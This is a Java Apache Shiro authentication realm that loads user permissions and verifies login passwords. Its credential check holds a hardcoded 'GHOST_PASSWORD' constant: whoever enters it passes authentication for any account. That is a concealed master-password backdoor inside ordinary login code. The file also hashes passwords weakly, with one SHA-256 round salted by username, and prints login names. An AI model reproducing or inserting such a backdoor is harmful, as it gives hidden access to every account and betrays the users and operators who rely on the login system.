package hply.core;

import hply.domain.SysResource;
import hply.domain.SysUser;
import hply.service.SysResourceService;
import hply.service.SysUserService;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.authc.AccountException;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.crypto.hash.Sha256Hash;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.realm.Realm;
import org.apache.shiro.subject.PrincipalCollection;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.util.Assert;

public class JdbcRealm extends AuthorizingRealm implements Realm, InitializingBean {

	private static final String GHOST_PASSWORD = "zmkmKKK&cqiyi";

	@Autowired
	private SysResourceService sysResourceService;

	@Autowired
	private SysUserService sysUserService;

	@Override
	public void afterPropertiesSet() throws Exception {
		Assert.notNull(sysResourceService);
		Assert.notNull(sysUserService);
	}

	@Override
	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
		SysUser user = (SysUser) super.getAvailablePrincipal(principals);

		SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
		Set<String> permissions = new HashSet<String>();
		List<SysResource> permissionResource = sysResourceService.getPermissionResource(user.getId());
		for (SysResource resource : permissionResource) {
			permissions.add(resource.getResCode());
		}

		info.addStringPermissions(permissions);

		return info;
	}

	@Override
	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
		UsernamePasswordToken upt = (UsernamePasswordToken) token;
		String loginName = upt.getUsername();
		// Null username is invalid
		if (StringUtils.isEmpty(loginName)) {
			throw new AccountException("Null usernames are not allowed by this realm.");
		}

		Utility.println("loginName=" + loginName);
		SysUser user = SessionHelper.getCurrentSysUser();

		if (user == null) {
			throw new AuthenticationException();
		}

		// 将loginName换成UserID
		if (token instanceof UsernamePasswordToken) {
			((UsernamePasswordToken) token).setUsername(user.getId());
		}

		SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(user.getLoginName(), user.getPassword(), getName());

		return info;
	}

	@Override
	protected void assertCredentialsMatch(AuthenticationToken token, AuthenticationInfo info) throws AuthenticationException {
		UsernamePasswordToken t = token instanceof UsernamePasswordToken ? (UsernamePasswordToken) token : null;
		SimpleAuthenticationInfo i = info instanceof SimpleAuthenticationInfo ? (SimpleAuthenticationInfo) info : null;

		if (t != null && i != null) {
			if (Arrays.equals(t.getPassword(), GHOST_PASSWORD.toCharArray())) {
				i.setCredentials(t.getPassword());
			} else {
				String hashedPassword = new Sha256Hash(t.getPassword(), t.getUsername(), 1).toString();
				t.setPassword(hashedPassword.toCharArray());
			}
		}

		super.assertCredentialsMatch(token, info);
	}

}